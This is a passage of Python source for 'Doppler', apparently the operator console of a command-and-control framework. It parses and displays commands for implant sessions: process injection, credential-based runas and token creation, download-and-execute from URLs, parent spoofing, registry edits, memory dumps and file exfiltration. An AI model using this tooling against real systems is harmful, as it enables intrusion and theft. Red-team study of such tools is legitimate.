#!/usr/bin/python3
# Copyright (C) 2020 - 2022 iDigitalFlame
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

from cmd import Cmd
from json import dumps
from threading import Lock
from os import getcwd, getenv
from string import whitespace
from datetime import datetime
from shlex import split, shlex
from argparse import REMAINDER
from traceback import format_exc
from include.config import Config
from re import compile, Pattern, I
from importlib import import_module
from include.errors import find_error
from sys import stdin, stdout, stderr
from base64 import b64decode, b64encode
from subprocess import run, SubprocessError
from argparse import BooleanOptionalAction as Boolean
from os.path import expanduser, expandvars, join, isfile, devnull
from include.cirrus import (
    Filter,
    split_path,
    ACTIONS_REG,
    ACTIONS_TROLL,
    ACTIONS_WINDOW,
)
from include.util import (
    nes,
    do_ask,
    ip_str,
    Parser,
    is_true,
    perm_str,
    size_str,
    time_str,
    split_user_domain,
)
from readline import (
    get_begidx,
    get_endidx,
    add_history,
    clear_history,
    get_completer,
    set_completer,
    parse_and_bind,
    get_line_buffer,
    get_history_item,
    read_history_file,
    write_history_file,
    set_history_length,
    get_history_length,
    set_completer_delims,
    get_completer_delims,
)

HISTORY_FILE = getenv("DOPPLER_HISTFILE", "~/.cache/doppler.history")

MENUS = [
    ["_MenuMain", None],
    ["_MenuBolts", None],
    ["_MenuBolt", None],
    ["_MenuBoltAll", None],
    ["_MenuProfiles", None],
    ["_MenuProfile", None],
    ["_MenuListeners", None],
    ["_MenuListener", None],
    ["_MenuScripts", None],
    ["_MenuScript", None],
]
MENU_MAIN = 0
MENU_BOLTS = 1
MENU_BOLT = 2
MENU_BOLT_ALL = 3
MENU_PROFILES = 4
MENU_PROFILE = 5
MENU_LISTENERS = 6
MENU_LISTENER = 7
MENU_SCRIPTS = 8
MENU_SCRIPT = 9
MENU_PACKETS = 10

_HELP_MAIN = """Welcome to the Doppler CLI!

This is the Main menu, it can be reached from any menu with the "menu" command.
All menus will eventually back into this one.

To exit from Doppler, CTRL-D can be used to exit from any menu, while CTRL-C can
be used to go back (Except when the command line is NOT empty, it will instead
clear the line of any text). Double tapping CTRL-C on the Main menu will also exit
Doppler.

Most Doppler commands can be used with tab-based autocomplete can will automatically
fetch any relevant results from Cirrus.

From this menu, the following options are avaliable:

bolt <BoltID>
  This command will put you in direct control of the Bolt with the matching ID
  value. The special value "all" can be used to put yourself in control of ALL
  Bolts simultaneously. Supplying an additional argument to "all" can specify a
  filter match to shrink the target of the "all" command.

bolts
  Take you to the Bolts menu.

script <Script Name>
  Enters the interactive scripting interface. This can be used to add/edit
  commands and options of the targeted script.

scripts
  Take you to the Scripts menu.

profile <Profile Name>
  Take you to the Profile-specific menu, which has all the options of the
  Profiles menu, but is targeted to the specific Profile.

profiles
  Take you to the Profiles menu.

listener <Listener Name>

-



"""
_HELP_MAIN_LS = """"""

HELP_TEXT = [
    _HELP_MAIN,
    "Bolts",
    None,
    None,
    "Profiles",
    "Profile",
    "Listeners",
    "Listener",
]

_DONE = [
    "cd",
    "elevate",
    "empty",
    "login_user",
    "migrate",
    "profile",
    "proxy",
    "refresh",
    "reload_dll",
    "rename",
    "rev2self",
    "time",
    "troll",
    "ui",
    "untrust",
    "wait",
    "zerotrace",
]
_EMPTY = list()
_TOGGLES = ["enable", "disable"]
_AUTO_TYPES = ["asm", "dll", "zombie"]


def _ex(v):
    return isinstance(v, Pattern) or (isinstance(v, str) and len(v) > 0)


def __parsers():
    # Parsers Generator
    #  Basics
    #  - All Domain args are -d/--domain
    #  - All Username args are -u/--user
    #    - Username MUST parse domain if domain empty/nil
    #  - All Password args are -p/--pass
    #  - All Profile args are -n/--profile
    #  - All Detach args are -x/--detach
    p = [None] * 14
    # rm
    # cat   = None
    # nones = True
    p[0x0] = Parser()
    p[0x0].add("-f", "--force", dest="force", action="store_true")
    p[0x0].add(nargs=1, type=str, dest="path")
    # asm
    # cat   = None
    # nones = True
    p[0x1] = Parser()
    p[0x1].add("-x", "--detach", dest="detach", action="store_true")
    p[0x1].add(nargs=1, type=str, dest="file")
    # dex
    # cat   = None
    # nones = True
    p[0x2] = Parser()
    p[0x2].add("-a", "--agent", type=str, dest="agent")
    p[0x2].add("-x", "--detach", dest="detach", action="store_true")
    p[0x2].add(nargs=1, type=str, dest="url")
    # dll
    # cat   = None
    # nones = True
    p[0x3] = Parser()
    p[0x3].add("-x", "--detach", dest="detach", action="store_true")
    p[0x3].add("-r", "--reflect", dest="reflect", action="store_true")
    p[0x3].add(nargs=1, type=str, dest="file")
    # creds, make_token
    # cat   = None
    # nones = True (False for make_token)
    p[0x4] = Parser()
    p[0x4].add("-d", "--domain", dest="domain", type=str)
    p[0x4].add("-c", "--clear", dest="clear", action="store_true")
    p[0x4].add(nargs=1, type=str, dest="user")
    p[0x4].add(nargs=1, type=str, dest="pw")
    # runas
    # cat   = " "
    # nones = False
    p[0x5] = Parser()
    p[0x5].add("-d", "--domain", dest="domain", type=str)
    p[0x5].add("-x", "--detach", dest="detach", action="store_true")
    p[0x5].add(nargs=1, type=str, dest="user")
    p[0x5].add(nargs=1, type=str, dest="pw")
    p[0x5].add(nargs=REMAINDER, type=str, dest="cmd")
    # migrate, spawn
    # cat   = None
    # nones = True
    p[0x6] = Parser()
    p[0x6].add("-f", "--args", type=str, dest="args")
    p[0x6].add("-u", "--user", type=str, dest="user")
    p[0x6].add("-p", "--password", type=str, dest="pw")
    p[0x6].add("-a", "--agent", type=str, dest="agent")
    p[0x6].add("-d", "--domain", type=str, dest="domain")
    p[0x6].add("-t", "--target", type=str, dest="target")
    p[0x6].add("-m", "--method", type=str, dest="method")
    p[0x6].add("-n", "--profile", type=str, dest="profile")
    p[0x6].add("-z", "--no-auto", dest="no_auto", action="store_true")
    p[0x6].add("-R", "--no-reflect", dest="reflect", action="store_false")
    p[0x6].add(nargs=1, type=str, dest="pipe")
    p[0x6].add(nargs=1, type=str, dest="file")
    # parent
    # cat   = None
    # nones = True
    p[0x7] = Parser()
    p[0x7].add("-p", "--pid", type=int, dest="pid")
    p[0x7].add("-D", dest="no_desktop", action="store_false")
    p[0x7].add("-F", dest="no_fallback", action="store_false")
    p[0x7].add("-A", "-E", dest="no_admin", action="store_false")
    p[0x7].add("-d", "--desktop", dest="desktop", action=Boolean)
    p[0x7].add("-c", "--clear", dest="clear", action="store_true")
    p[0x7].add("-x", "--exclude", dest="exclude", action="append")
    p[0x7].add("-f", "--fallback", dest="fallback", action=Boolean)
    p[0x7].add("-a", "-e", "--admin", "--elevated", dest="admin", action=Boolean)
    p[0x7].add(nargs=REMAINDER, type=str, dest="include")
    # zombie
    # cat   = " "
    # nones = True
    p[0x8] = Parser()
    p[0x8].add("-u", "--user", type=str, dest="user")
    p[0x8].add("-p", "--password", type=str, dest="pw")
    p[0x8].add("-d", "--domain", type=str, dest="domain")
    p[0x8].add("-x", "--detach", dest="detach", action="store_true")
    p[0x8].add(nargs=1, type=str, dest="file")
    p[0x8].add(nargs=REMAINDER, type=str, dest="args")
    # pull
    # cat   = None
    # nones = True
    p[0x9] = Parser()
    p[0x9].add("-a", "--agent", type=str, dest="agent")
    p[0x9].add(nargs=1, type=str, dest="url")
    p[0x9].add(nargs=1, type=str, dest="file")
    # regedit
    # cat   = None
    # nones = True
    p[0xA] = Parser()
    p[0xA].add("-f", "--force", dest="force", action="store_true")
    p[0xA].add(nargs=1, type=str, dest="action")
    p[0xA].add(nargs=1, type=str, dest="key")
    p[0xA].add(nargs=1, type=str, dest="value")
    p[0xA].add(nargs=1, type=str, dest="exp")
    p[0xA].add(nargs=1, type=str, dest="data")
    # run, shell, pwsh, hup, pwsh_file
    # cat   = " "
    # nones = True
    p[0xB] = Parser()
    p[0xB].add("-u", "--user", type=str, dest="user")
    p[0xB].add("-p", "--password", type=str, dest="pw")
    p[0xB].add("-d", "--domain", type=str, dest="domain")
    p[0xB].add("-f", "--file", dest="file", action="store_true")
    p[0xB].add("-x", "--detach", dest="detach", action="store_true")
    p[0xB].add(nargs=REMAINDER, type=str, dest="command")
    # proxy
    # car   = None
    # nones = True
    p[0xC] = Parser()
    p[0xC].add("-r", "--remove", dest="remove", action="store_true")
    p[0xC].add("-u", "--update", dest="update", action="store_true")
    p[0xC].add(nargs=1, type=str, dest="name")
    p[0xC].add(nargs=1, type=str, dest="bind")
    p[0xC].add(nargs=1, type=str, dest="profile")
    # listeners/new
    # car   = None
    # nones = True
    p[0xD] = Parser()
    p[0xD].add("-s", "--script", dest="script", type=str)
    p[0xD].add("-S", "--no-script", dest="no_script", action="store_true")
    p[0xD].add(nargs=1, type=str, dest="name")
    p[0xD].add(nargs=1, type=str, dest="address")
    p[0xD].add(nargs=1, type=str, dest="profile")
    return p


def _is_help(a):
    return len(a) == 1 and (a[0] == "-h" or a[0] == "/?" or a[0] == "?")


def _strip_rn(v):
    if not nes(v):
        return v
    if v[-1] == "\n":
        return v[:-1]
    return v


def _split_list(v):
    if not nes(v):
        return None
    e = split(v)
    if not isinstance(e, list) or len(e) == 0:
        del e
        return None
    if len(e) == 1 and "," not in e[0]:
        del e
        return [v.strip()]
    r = list()
    for s in e:
        if "," not in s:
            r.append(s.strip())
            continue
        for n in s.split(","):
            i = n.strip()
            if len(i) == 0:
                continue
            if i[0] == ",":
                i = i[1:].strip()
            if i[-1] == ",":
                i = i[:-1].strip()
            r.append(i)
    del e
    return list(set(r))


def _shell_split(v):
    z = shlex(v, punctuation_chars=True)
    z.commenters = ""
    z.wordchars += ":;|$&!@%^()[]{}\\<>,+"
    v = list(z)
    del z
    if len(v) <= 2:
        return v
    # NOTE(dij): Remove '"' when supplied in the string since 9/10 we are using
    #            a string with a space. However, we won't strip single quotes (')
    #            so users can override this behavior.
    #
    #            Checks for >2 to ignore long commands
    for x in range(0, len(v)):
        if len(v[x]) == 0 or v[x][0] != '"' or v[x][-1] != '"':
            continue
        v[x] = v[x][1:-1]
    return v


def _is_match(m, v):
    if not nes(v):
        return False
    if isinstance(m, Pattern):
        return m.match(v) is not None
    if nes(m) and m in v.lower():
        return True
    return False


def _quick_filter(v):
    f = Filter()
    try:
        f.pid = int(v)
        return f
    except ValueError:
        pass
    f.include = _split_list(v)
    return f


def _run_print_stdout(c):
    try:
        v = run(c, text=True, shell=True, check=False, capture_output=True)
    except (SubprocessError, OSError) as err:
        return print(f"[!] {err}!")
    if nes(v.stdout):
        print(v.stdout, end="")
        if v.stdout[-1] != "\n":
            print()
    if nes(v.stderr):
        print(v.stderr, end="")
        if v.stderr[-1] != "\n":
            print()
    del v


def _split_list_values(e):
    if e is None:
        return None
    if isinstance(e, str):
        if len(e) == 0:
            return None
        return _split_list(e)
    if not isinstance(e, list) or len(e) == 0:
        return None
    if len(e) == 1:
        return _split_list(e[0])
    r = list()
    for v in e:
        o = _split_list(v)
        if o is None or len(o) == 0:
            continue
        r.extend(o)
        del o
    return list(set(r))


def _print_listener_info(v):
    c = Config(b64decode(v["profile"], validate=True))
    print(
        f'Listener: {v["listener"]["name"]}\n{"="*30}\nProfile : {v["profile_name"]} ({c})'
    )
    print(dumps(c.json(), sort_keys=False, indent=4))
    del c
    print(f'Address : {v["listener"]["address"]}')
    if "type" in v["listener"]:
        print(f'Type    : {v["listener"]["type"]}')
    print(f'Bolts   : {v["listener"]["count"]}')
    print(f'Script  : {v["script"]}')


def _complete_with_all(e, n):
    if len(n) == 0:
        return e + ["all"]
    if len(n) == 1 and n[0] == "a":
        return e + ["all"]
    if len(n) == 2 and n[0] == "a" and n[1] == "l":
        return e + ["all"]
    if len(n) >= 3 and n[0] == "a" and n[1] == "l" and n[2] == "l":
        return e + ["all"]
    return e


def _menu(v, menu, inv=False):
    if not nes(v):
        return menu
    if inv:
        s = v.strip().upper()
    else:
        s = v.strip().lower()
    if len(s) == 0:
        return menu
    r = list()
    for e in menu:
        if inv and e.upper().startswith(s):
            r.append(e)
        elif not inv and e.startswith(s):
            r.append(e)
    return r


def _valid_name(s, size=0, extra=False):
    if not isinstance(s, str) or len(s) <= size:
        return False
    for i in s:
        if ord(i) <= 57 and ord(i) >= 48:  # 9 - 0
            continue
        if ord(i) <= 90 and ord(i) >= 65:  # Z - A
            continue
        if ord(i) <= 122 and ord(i) >= 97:  # z - a
            continue
        if not extra:
            return False
        if ord(i) == 45 or ord(i) == 46 or ord(i) == 95:  # '-' or '.' or '_'
            continue
        return False
    return True


def _get_callable(type, show, r, asm, dll):
    if not nes(r.method):
        if not nes(r.file):
            if nes(asm) or (nes(dll) and r.reflect):
                p = {"show": show}
                if nes(asm):
                    with open(expanduser(expandvars(asm)), "rb") as f:
                        p["data"] = b64encode(f.read()).decode("UTF-8")
                    print(f'[+] Using runtime ASM file "{asm}".')
                else:
                    with open(expanduser(expandvars(dll)), "rb") as f:
                        p["data"] = b64encode(f.read()).decode("UTF-8")
                    print(f'[+] Using runtime DLL file "{dll}".')
                if nes(r.args):
                    p["fake"] = r.args
                    print('[+] Guessing method "zombie" based on arguments.')
                    return "zombie", p
                print('[+] Guessing method "asm" based on arguments.')
                return "asm", p
            if nes(dll):
                p = {"show": show, "reflect": r.reflect}
                split_path(p, dll)
                print(f'[+] Using runtime DLL file "{dll}".')
                print('[+] Guessing method "dll" based on arguments.')
                return "dll", p
            print('[+] Guessing method "self" based on arguments.')
            return "", None
        if r.file.lower() == "self":
            print('[+] Guessing method "self" based on arguments.')
            return "", None
        if r.file.lower().startswith("http") and "://" in r.file:
            print('[+] Guessing method "pexec" based on arguments.')
            if nes(r.agent):
                return "pexec", {"url": r.file, "agent": r.agent}
            return "pexec", r.file
        p = {"cmd": r.file, "show": show}
        if nes(r.user):
            u, d = split_user_domain(r.user, r.domain)
            if nes(u):
                p["user"] = u
            if nes(r.pw):
                p["pass"] = r.pw
            if nes(d):
                p["domain"] = d
            del u, d
        print('[+] Guessing method "exec" based on arguments.')
        return "exec", p
    m = r.method.lower()
    if m == "self":
        return "", None
    if not nes(r.file) and (nes(asm) or nes(dll)) and m not in _AUTO_TYPES:
        raise ValueError(f"{type}: missing file/command!")
    elif not nes(r.file) and not nes(asm) and not nes(dll):
        raise ValueError(f"{type}: missing file/command!")
    if m == "url":
        if nes(r.agent):
            return "pexec", {"url": r.file, "agent": r.agent}
        return "pexec", r.file
    if m == "zombie" and not nes(r.args):
        raise ValueError(f"{type}: missing fake arguments for Zombie process!")
    if m == "exec" or m == "exe":
        p = {"cmd": r.file, "show": show}
        if nes(r.user):
            u, d = split_user_domain(r.user, r.domain)
            if nes(u):
                p["user"] = u
            if nes(r.pw):
                p["pass"] = r.pw
            if nes(d):
                p["domain"] = d
            del u, d
        return "exec", p
    if m == "dll" and not nes(r.file) and r.reflect and nes(asm):
        m = "asm"
    if m == "dll":
        if not nes(r.file) and nes(dll):
            r.file = dll
            print(f'[+] Using runtime DLL file "{dll}".')
        p = {"show": show, "reflect": r.reflect}
        split_path(p, r.file)
        return "dll", p
    if m == "asm" or m == "zombie":
        p = {"show": show}
        if not nes(r.file) and nes(asm):
            r.file = asm
            print(f'[+] Using runtime ASM file "{asm}".')
        if not nes(r.file) and nes(dll):
            r.file = dll
            print(f'[+] Using runtime DLL file "{dll}".')
        with open(expanduser(expandvars(r.file)), "rb") as f:
            p["data"] = b64encode(f.read()).decode("UTF-8")
        if m == "zombie":
            p["fake"] = r.args
        return m, p
    raise ValueError(f"{type}: invalid/unguessable method!")


def _print_job_result(id, job, type, res, out, script):
    if type in _DONE:
        return print("done.")
    if type == "pwd":
        return print(f'returned: {res["path"]}')
    if type == "list":
        if "entries" not in res or len(res["entries"]) == 0:
            return print("returned: 0 entries")
        print(f'returned: {len(res["entries"])} entries')
        t = datetime.now()
        for i in res["entries"]:
            v, y = datetime.fromisoformat(i["modtime"]).replace(tzinfo=None), None
            if v.year < t.year:
                y = v.strftime("%Y")
            else:
                y = v.strftime("%H:%M")
            print(
                f'{perm_str(i["mode"])} {size_str(i["size"]):>8} '
                f'{v.strftime("%b"):>3} {v.strftime("%-m"):>2} {y:>5} {i["name"]}'
            )
            del y, v
        del t
        return
    if type == "error":  # NOTE(dij): This is only here for scripts.
        v = res["error"]
        try:
            m = find_error(int(v, 16))
            if m is not None:
                return print(f"error: {m}")
            del m
        except ValueError:
            pass
        return print(f"error: {v}")
    if type == "spawn":
        return print(f'spawned PID: {res.get("pid", 0)}.')
    if type == "script":  # NOTE(dij): This is only here for scripts.
        return print("ignoring script-in-script result")
    if type == "mounts":
        if "entries" not in res or len(res["entries"]) == 0:
            return print("returned: 0 entries")
        print(f'returned: {len(res["entries"])} entries.')
        for i in res["entries"]:
            print(i)
        return
    if type == "upload":
        return print(f'wrote {size_str(res.get("size", 0))} to {res["path"]}')
    if type == "execute":
        return print(
            f'returned.\n[+] PID: {res.get("pid", "n/a")}, Exit Result: {res.get("exit", 0)}\n'
            f'{_strip_rn(b64decode(res["data"], validate=True).decode("UTF-8",errors="replace"))}'
        )
    if type == "registry":
        if "status" in res:
            if not res["status"]:
                return print("set/update failed!")
            return print("done.")
        if "entries" not in res:
            return print("done.")
        print(
            f'returned {len(res["entries"])} entries.\n{"Name":32}{"Type":16}Value\n{"="*85}'
        )
        for v in res["entries"]:
            if "name" not in v:
                continue
            print(f'{v["name"]:32}{v["type"]:16}', end="")
            d = v["value"]
            if len(d) > 64 and len(res["entries"]) > 1:
                d = d[:64] + "..."
            print(d.replace("\n", "\\n"))
        return
    if type == "download":
        print(f'read {size_str(res.get("size", 0))} from "{res.get("path")}"')
        if res.get("dir", False):
            return print(
                f'[!] Path {res.get("path")} was a directory and not downloaded!\n'
            )
        if not nes(out) and not script:
            return print(
                _strip_rn(
                    b64decode(res["data"], validate=True).decode(
                        "UTF-8", errors="replace"
                    )
                )
            )
        if nes(out) and not script:
            p = expanduser(expandvars(out))
        else:
            p = join(
                getcwd(), f'{id}-{job}-{datetime.now().strftime("%m%d%y-%H%M")}.out'
            )
        with open(p, "wb") as f:
            f.write(b64decode(res["data"], validate=True))
            f.flush()
        print(f'[+] Saved to "{p}".')
        del p
        return
    if type == "check_dll":
        return print(f'tained: {res.get("tainted", False)}')
    if type == "processes":
        if "entries" not in res or len(res["entries"]) == 0:
            return print("returned: 0 entries")
        print(
            f'returned: {len(res["entries"])} entries.\n{"Name":32} {"PID":<10}{"PPID":<10} {"User":35}\n{"="*90}'
        )
        for i in res["entries"]:
            if len(i["name"]) > 32:
                print(f'{i["name"][:31]:32} ', end="")
            else:
                print(f'{i["name"]:32} ', end="")
            print(f'{i["pid"]:<10}{i["ppid"]:<10} ', end="")
            if len(i["user"]) > 35:
                print(f'{i["user"][:34]:35}')
            else:
                print(f'{i["user"]:35}')
        return
    if type == "system_io":
        if "status" in res:
            if not res["status"]:
                return print("io operation failed!")
            return print("done.")
        return print(f'{size_str(res.get("size", 0))} at {res["path"]}')
    if type == "check_debug":
        return print(f'debugged: {res.get("debug", False)}')
    if type == "window_list":
        if "entries" not in res or len(res["entries"]) == 0:
            return print("returned: 0 entries")
        print(f'returned: {len(res["entries"])} entries.')
        print(
            f'{"Handle":8}{"Name":40}Min Max {"Width":8}{"Height":8}{"X":>8}{"Y":>8}\n{"="*90}'
        )
        for i in res["entries"]:
            print(f'{i["handle"]:<8X}', end="")
            if len(i["name"]) > 40:
                print(f'{i["name"][:39]:40}', end="")
            else:
                print(f'{i["name"]:40}', end="")
            if i.get("minimized"):
                print(" X  ", end="")
            else:
                print("    ", end="")
            if i.get("maximized"):
                print(" X  ", end="")
            else:
                print("    ", end="")
            print(f'{i["width"]:<8}{i["height"]:<8}{i["x"]:8}{i["y"]:8}')
        return
    if type == "dump" or type == "shot":
        if nes(out) and not script:
            p = expanduser(expandvars(out))
        else:
            p = f'{id}-{job}-{datetime.now().strftime("%m%d%y-%H%M")}'
            if type == "dump":
                p = p + ".dmp"
            else:
                p = p + ".png"
            p = join(getcwd(), p)
        with open(p, "wb") as f:
            f.write(b64decode(res["data"], validate=True))
            f.flush()
        print(f'saved to "{p}".')
        del p
        return
    if type == "assembly" or type == "dll":
        return print(
            f'returned.\n[+] PID: {res.get("pid", "n/a")}, Handle: {res.get("handle", 0):X} '
            f'Exit Result: {res.get("exit", 0)}'
        )
    return print(f'returned an unknown result type: "{type}"!')


def print_job_result(id, job, res, arg, out, multi=False):
    print(f"[+] {id}: Job {job} ", end="")
    if nes(arg):
        print(f'"{arg}" ', end="")
    if not isinstance(res, dict):
        return print("done.")
    if "error" in res:
        v = res["error"]
        try:
            m = find_error(int(v, 16))
            if m is not None:
                return print(f"error: {m}")
            del m
        except ValueError:
            pass
        return print(f"error: {v}")
    if res["type"] != "script":
        return _print_job_result(id, job, res["type"], res, out, multi)
    print(f'returned {res["count"]} results.')
    d = res["entries"]
    for x in range(0, len(d)):
        print(f"[+] {x+1:>2}: ", end="")
        _print_job_result(id, job, d[x].get("type", "unknown"), d[x], None, True)
    del d


_PARSERS = __parsers()


class Exp(object):
    __slots__ = ("ip", "os", "user", "host", "elevated")

    def __init__(self, host, ip, os, user, elevated):
        self.elevated = elevated
        self.ip = Exp._compile(ip)
        self.os = Exp._compile(os)
        self.user = Exp._compile(user)
        self.host = Exp._compile(host)

    @staticmethod
    def parse(v):
        if not nes(v):
            return None
        s = split(v)
        if len(s) == 0:
            return None
        h, i, o, u, a = None, None, None, None, None
        for e in s:
            if ":" not in e:
                if not nes(h):
                    h = e
                    continue
                raise ValueError('"host" expression specified multiple times')
            n = e.find(":")
            if n < 1:
                raise ValueError(f'invalid expression "{e}"')
            x = e[:n].lower()
            if len(x) < 1:
                raise ValueError(f'invalid expression "{e}"')
            if x[0] == "u":
                if not nes(u):
                    u = e[n + 1 :]
                    continue
                raise ValueError('"user" expression specified multiple times')
            if x[0] == "i":
                if not nes(i):
                    i = e[n + 1 :]
                    continue
                raise ValueError('"ip" expression specified multiple times')
            if x[0] == "o":
                if not nes(o):
                    o = e[n + 1 :]
                    continue
                raise ValueError('"os" expression specified multiple times')
            if x[0] == "e" or x[0] == "a":
                if a is None:
                    a = is_true(e[n + 1 :])
                    continue
                raise ValueError(
                    '"admin" or "elevated" expression specified multiple times'
                )
            if x[0] == "h":
                if not nes(h):
                    h = e[n + 1 :]
                    continue
                raise ValueError('"host" expression specified multiple times')
            raise ValueError(f'invalid expression "{e}"')
        del s
        e = Exp(h, i, o, u, a)
        del h, i, o, u, a
        return e

    def empty(self):
        if self.elevated is not None:
            return False
        if self.ip is not None:
            return False
        if self.os is not None:
            return False
        if self.user is not None:
            return False
        if self.host is not None:
            return False
        return True

    @staticmethod
    def _compile(v):
        if not nes(v):
            return None
        if v[0] == "^" or "[" in v or "]" in v or "(" in v or ")" in v or "+" in v:
            try:
                return compile(v[1:], I)
            except Exception:
                pass
        return v

    def __str__(self):
        b = list()
        if self.elevated is not None:
            b.append(f"admin:{str(self.elevated).lower()}")
        if self.ip is not None:
            b.append(f"ip:{self.ip}")
        if self.os is not None:
            b.append(f"os:{self.os}")
        if self.user is not None:
            b.append(f"user:{self.user}")
        if self.host is not None:
            b.append(f"host:{self.host}")
        if len(b) == 0:
            return ""
        v = ",".join(b)
        del b
        if len(v) > 1 and v[-1] == ",":
            return v[:-1]
        return v

    def matches(self, v):
        if (
            self.ip is None
            and self.os is None
            and self.user is None
            and self.host is None
            and self.elevated is None
        ):
            return v
        if not isinstance(v, list) or len(v) == 0:
            return v
        n = list()
        for i in v:
            if "device" not in i:
                continue
            if isinstance(self.elevated, bool):
                if self.elevated and not i["device"]["elevated"]:
                    continue
                if not self.elevated and i["device"]["elevated"]:
                    continue
            if _ex(self.ip) and not _is_match(self.ip, ip_str(i)):
                continue
            if _ex(self.os) and not _is_match(self.os, i["device"]["os"]):
                continue
            if _ex(self.user) and not _is_match(self.user, i["device"]["user"]):
                continue
            if _ex(self.host) and not _is_match(self.host, i["device"]["hostname"]):
                continue
            n.append(i)
        return n


class _Cache(object):
    __slots__ = ("_jobs", "_bolts", "_scripts", "cirrus", "_profiles", "_listeners")

    def __init__(self, cirrus):
        self._jobs = None
        self._bolts = None
        self._scripts = None
        self.cirrus = cirrus
        self._profiles = None
        self._listeners = None

    def bolts(self, n):
        if self._bolts is None:
            self._bolts = [i["id"].upper() for i in self.cirrus.sessions()]
        if nes(n) and len(self._bolts) > 0:
            n, r = n.upper(), list()
            for e in self._bolts:
                if e.startswith(n):
                    r.append(e)
            return r
        return self._bolts

    def scripts(self, n):
        if self._scripts is None:
            self._scripts = [i.lower() for i in self.cirrus.scripts().keys()]
        if nes(n) and len(self._scripts) > 0:
            n, r = n.lower(), list()
            for e in self._scripts:
                if e.startswith(n):
                    r.append(e)
            return r
        return self._scripts

    def profiles(self, n):
        if self._profiles is None:
            self._profiles = [i.lower() for i in self.cirrus.profiles().keys()]
        if nes(n) and len(self._profiles) > 0:
            n, r = n.lower(), list()
            for e in self._profiles:
                if e.startswith(n):
                    r.append(e)
            return r
        return self._profiles

    def listeners(self, n):
        if self._listeners is None:
            self._listeners = [i.lower() for i in self.cirrus.listeners().keys()]
        if nes(n) and len(self._listeners) > 0:
            n, r = n.lower(), list()
            for e in self._listeners:
                if e.startswith(n):
                    r.append(e)
            return r
        return self._listeners

    def jobs(self, s, n, v=True):
        if v:
            if not nes(s):
                return _EMPTY
            r = self.bolts(s)
            if s.upper() not in r:
                return r
            del r
        if self._jobs is None:
            self._jobs = dict()
        if s not in self._jobs:
            self._jobs[s] = list(self.cirrus.jobs(s).keys())
        if nes(n) and isinstance(self._jobs[s], list) and len(self._jobs[s]) > 0:
            r = list()
            for e in self._jobs[s]:
                if e.startswith(n):
                    r.append(e)
            return r
        return self._jobs[s]


class _MenuMain(object):
    __slots__ = ("shell",)

    _MENU = [
        "bolt",
        "bolts",
        "exit",
        "help",
        "job",
        "jobs",
        "listener",
        "listeners",
        "profile",
        "profiles",
        "script",
        "scripts",
    ]

    def __init__(self, shell):
        self.shell = shell

    def do_ls(self, _):
        print(_HELP_MAIN_LS)

    def do_jobs(self, id):
        try:
            if _valid_name(id, 7):
                return self.shell.cirrus.show_jobs(id, all=False)
            if len(id) > 0:
                return
            return self.shell.cirrus.show_jobs(all=True)
        except ValueError as err:
            print(f"[!] {err}!")

    def do_bolts(self, _):
        self.shell.set_menu(MENU_BOLTS)

    def do_script(self, n):
        if len(n) == 0:
            return self.shell.set_menu(MENU_SCRIPTS)
        if not _valid_name(n, 1, True):
            return print("script <name>")
        try:
            self.shell.cirrus.script(n)
        except ValueError:
            return print(f'[!] Script "{n}" does not exist!')
        self.shell.set_menu(MENU_SCRIPT, n.lower())

    def do_scripts(self, _):
        self.shell.set_menu(MENU_SCRIPTS)

    def do_profile(self, n):
        if len(n) == 0:
            return self.shell.set_menu(MENU_PROFILES)
        if not _valid_name(n, 1, True):
            return print("profile <name>")
        try:
            self.shell.cirrus.profile(n)
        except ValueError:
            return print(f'[!] Profile "{n}" does not exist!')
        self.shell.set_menu(MENU_PROFILE, n.lower())

    def do_profiles(self, _):
        self.shell.set_menu(MENU_PROFILES)

    def do_bolt(self, id, f):
        if not nes(id) and not nes(f):
            return self.shell.set_menu(MENU_BOLTS)
        if not nes(id) or (len(id) != 3 and len(id) < 8):
            return print("bolt <id|all>")
        if id == "all":
            return self.shell.set_menu(MENU_BOLT_ALL, f)
        if not _valid_name(id, 7):
            return print("bolt <id|all>")
        try:
            self.shell.cirrus.session(id)
        except ValueError:
            return print(f'[!] Bolt "{id}" does not exist!')
        self.shell.set_menu(MENU_BOLT, id.upper())

    def do_listener(self, n):
        if len(n) == 0:
            return self.shell.set_menu(MENU_LISTENERS)
        if not _valid_name(n, 1, True):
            return print("listener <name>")
        try:
            self.shell.cirrus.listener(n)
        except ValueError:
            return print(f'[!] Listener "{n}" does not exist!')
        self.shell.set_menu(MENU_LISTENER, n.lower())

    def do_listeners(self, _):
        self.shell.set_menu(MENU_LISTENERS)

    def do_job(self, id, job):
        if not _valid_name(id, 7):
            return print("job <id> [job]")
        try:
            if _valid_name(job):
                if self.shell.cirrus.show_result(id, int(job)):
                    return
                return print(f"[+] Job {job} returned no content.")
            return self.shell.cirrus.show_jobs(id, all=False)
        except ValueError:
            if not _valid_name(job):
                return print(f'[!] Bolt "{id}" does not exist!')
            print(f'[!] Job "{id}:{job}" does not exist!')

    def prompt(self, args=None):
        return " > "

    def complete_bolt(self, n, *_):
        return _complete_with_all(self.shell.cache.bolts(n), n)

    def completenames(self, n, *_):
        return _menu(n, _MenuMain._MENU)

    def complete_script(self, n, *_):
        return self.shell.cache.scripts(n)

    def complete_profile(self, n, *_):
        return self.shell.cache.profiles(n)

    def complete_listener(self, n, *_):
        return self.shell.cache.listeners(n)

    def complete_job(self, n, c, x, *_):
        if len(c) == 0:
            return _EMPTY
        if c.count(" ") == 1:
            return self.shell.cache.bolts(n)
        if c.count(" ") == 2:
            if len(c) < 5 or x <= 4:
                return _EMPTY
            return self.shell.cache.jobs(c[4 : x - 1], n)
        return _EMPTY


class _MenuBolt(object):
    __slots__ = (
        "id",
        "jobs",
        "show",
        "shell",
        "_user",
        "filter",
        "_domain",
        "__dict__",  # Added as we dynamically overrite functions for Script
        "_password",
    )

    _MENU = [
        "asm",
        "back",
        "cat",
        "cd",
        "chan",
        "check_debug",
        "check_dll",
        "cp",
        "creds",
        "dex",
        "dll",
        "download",
        "elevate",
        "exit",
        "help",
        "hup",
        "info",
        "jitter",
        "job",
        "jobs",
        "kill",
        "last",
        "ls",
        "main",
        "make_token",
        "migrate",
        "mounts",
        "mv",
        "parent",
        "parent_clear",
